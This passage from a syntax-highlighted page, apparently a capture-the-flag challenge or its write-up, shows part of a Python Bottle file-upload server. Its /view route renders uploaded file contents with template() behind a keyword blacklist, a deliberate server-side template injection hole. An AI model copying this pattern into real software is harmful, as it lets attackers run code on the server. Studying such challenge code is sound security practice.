&lt;/a&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件不存在&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请求的路径不是文件&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;非法访问尝试&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法读取文件内容（可能是二进制文件）&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件内容包含不允许的关键词&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;渲染错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/static/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">serve_static</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;静态文件服务&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> static_file(filename, root=<span class="string">&#x27;static&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error404</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;讨厌啦不是说好只看看不摸的吗&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@error(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">error500</span>(<span class="params">error</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;不要透进来啊啊啊啊&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    os.makedirs(<span class="string">&#x27;static&#x27;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#原神，启动!</span></span><br><span class="line">    run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
 
